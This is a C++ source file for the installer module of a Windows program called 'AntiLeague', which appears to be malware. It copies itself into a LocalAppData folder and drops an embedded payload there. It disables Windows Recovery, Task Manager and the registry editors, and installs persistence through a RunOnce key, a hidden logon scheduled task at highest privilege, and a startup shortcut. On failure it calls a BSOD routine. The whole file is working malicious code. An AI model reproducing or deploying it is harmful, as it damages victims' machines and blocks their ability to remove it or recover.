#include "Install.h"
#include "payload.h"
#include <io.h>
#include <codecvt>
#include <fstream>
#include <comdef.h>
#include <filesystem>
#include <taskschd.h>
#include <ShlObj_core.h>

std::string c_Install::getInstallPath()
{
    wchar_t _localAppData[MAX_PATH] = { NULL };
    SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, _localAppData);

    if (_localAppData[0] == NULL)
    {
        BSOD();
        std::exit(1);
    }

    namespace FS = std::filesystem;

    for (auto& itr : FS::directory_iterator(_localAppData))
    {
        //Testing for access privileges
        std::error_code ec;
        FS::directory_iterator _localDir(itr.path(), ec);
        std::string path = itr.path().string();

        if (ec)
            continue;

        path += "\\AntiLeague.exe";

        if (_access_s(path.c_str(), 0) != 0)
        {
            wchar_t szExeFileName[MAX_PATH];
            GetModuleFileName(0, szExeFileName, MAX_PATH);

            std::ifstream infile(szExeFileName, std::ios::binary);
            std::string buffer((std::istreambuf_iterator<char>(infile)), (std::istreambuf_iterator<char>()));

            std::ofstream outfile(path, std::ios::binary);
            outfile << buffer;

            outfile.close();
            infile.close();

            path.erase(path.end() - 4, path.end());
            path += " - ";
            path += dec_key;

            outfile.open(path, std::ios::binary);
            outfile << *payload;
            outfile.close();

            return itr.path().string() + "\\AntiLeague.exe";
        }
        else
        {
            for (auto& it : _localDir)
            {
                if (it.path().wstring().find(L"AntiLeague - ") != std::wstring::npos)
                {
                    return path;
                }
            }

            path.erase(path.end() - 4, path.end());
            path += " - ";
            path += dec_key;

            std::ofstream outfile(path, std::ios::binary);
            outfile << *payload;
            outfile.close();

            return itr.path().string() + "\\AntiLeague.exe";
        }
    }
}

void c_Install::Install()
{
	std::string _Install = getInstallPath();

#if defined(DisableTaskMGR) || defined(DisableRegistry) || defined(RunOnceRegistry)
    HKEY hkey;
#endif

#ifdef DisableWinRE
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    wchar_t args[18] = L"reagentc /disable";
    if (CreateProcess(NULL, args, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
#endif

#ifdef DisableTaskMGR
    if (RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", NULL, NULL, NULL, KEY_SET_VALUE, NULL, &hkey, NULL) == ERROR_SUCCESS)
    {
        DWORD value = 1;
        RegSetValueEx(hkey, L"DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(value));
        RegCloseKey(hkey);
    }
#endif

#ifdef DisableRegistry
    if (RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", NULL, NULL, NULL, KEY_SET_VALUE, NULL, &hkey, NULL) == ERROR_SUCCESS)
    {
        DWORD value = 1;
        RegSetValueEx(hkey, L"DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(value));
        RegCloseKey(hkey);
    }
#endif

#ifdef RunOnceRegistry
    if (RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", NULL, NULL, NULL, KEY_SET_VALUE, NULL, &hkey, NULL) == ERROR_SUCCESS)
    {
        _Install.insert(0, "\"");
        _Install += "\"";

        RegSetValueExA(hkey, "*AntiLeague", NULL, REG_SZ, (LPBYTE)(_Install.c_str()), (_Install.size() + 1) * sizeof(wchar_t));
        RegCloseKey(hkey);
    }
#endif

#ifdef TaskSchedulerStartup
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, NULL, NULL);

    ITaskService* pService = NULL;
    CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);

    pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

    ITaskFolder* pRootFolder = NULL;
    pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    pRootFolder->DeleteTask(_bstr_t(L"AntiLeague"), 0);

    ITaskDefinition* pTask = NULL;
    pService->NewTask(0, &pTask);
    pService->Release();

    IRegistrationInfo* pRegInfo = NULL;
    pTask->get_RegistrationInfo(&pRegInfo);

    pRegInfo->put_Author(_bstr_t(L"Nick"));
    pRegInfo->Release();

    ITaskSettings* pSettings = NULL;
    pTask->get_Settings(&pSettings);

    pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
    pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
    pSettings->put_ExecutionTimeLimit(_bstr_t(L"PT0S"));
    pSettings->put_AllowHardTerminate(VARIANT_FALSE);
    pSettings->put_Hidden(VARIANT_TRUE);
    pSettings->Release();

    ITriggerCollection* pTriggerCollection = NULL;
    pTask->get_Triggers(&pTriggerCollection);

    ITrigger* pTrigger = NULL;
    pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
    pTriggerCollection->Release();

    ILogonTrigger* pLogonTrigger = NULL;
    pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
    pTrigger->Release();

    pLogonTrigger->put_Id(_bstr_t(L"Trigger1"));
    pLogonTrigger->Release();

    IPrincipal* pPrincipal;
    pTask->get_Principal(&pPrincipal);
    pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
    pPrincipal->Release();

    IActionCollection* pActionCollection = NULL;
    pTask->get_Actions(&pActionCollection);

    IAction* pAction = NULL;
    pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    pActionCollection->Release();

    IExecAction* pExecAction = NULL;
    pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
    pAction->Release();

#ifdef RunOnceRegistry
    pExecAction->put_Path(_bstr_t(_Install.c_str()));
#else
    _Install.insert(0, "\"");
    _Install += "\"";
    pExecAction->put_Path(_bstr_t(_Install.c_str()));
#endif
    pExecAction->Release();

    IRegisteredTask* pRegisteredTask = NULL;
    pRootFolder->RegisterTaskDefinition(_bstr_t(L"AntiLeague"), pTask, TASK_CREATE_OR_UPDATE, _variant_t(L"S-1-5-32-544"), _variant_t(), TASK_LOGON_GROUP, _variant_t(L""), &pRegisteredTask);

    pRootFolder->Release();
    pTask->Release();
    pRegisteredTask->Release();
    CoUninitialize();
#endif

#ifdef StartupFile
    wchar_t _startup[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, _startup);

    if (_startup[0] == NULL)
    {
        BSOD();
        std::exit(1);
    }

    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    std::wstring _wideInstall = converter.from_bytes(_Install);

	IShellLink* psl;
	CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);

	IPersistFile* ppf;
	psl->QueryInterface(IID_IPersistFile, (void**)&ppf);

	psl->Resolve(NULL, 0);
	psl->SetPath((LPCWSTR)_wideInstall.c_str());
	psl->SetWorkingDirectory((LPCWSTR)_wideInstall.erase(_wideInstall.find_last_of(L"\\/")).c_str());
	psl->SetArguments(NULL);
	psl->SetDescription(L"AntiLeague");

	std::wstring linkFile = (std::wstring)_startup + L"\\AntiLeague.lnk";
	ppf->Save((LPCWSTR)linkFile.c_str(), TRUE);

	ppf->Release();
	psl->Release();
#endif
}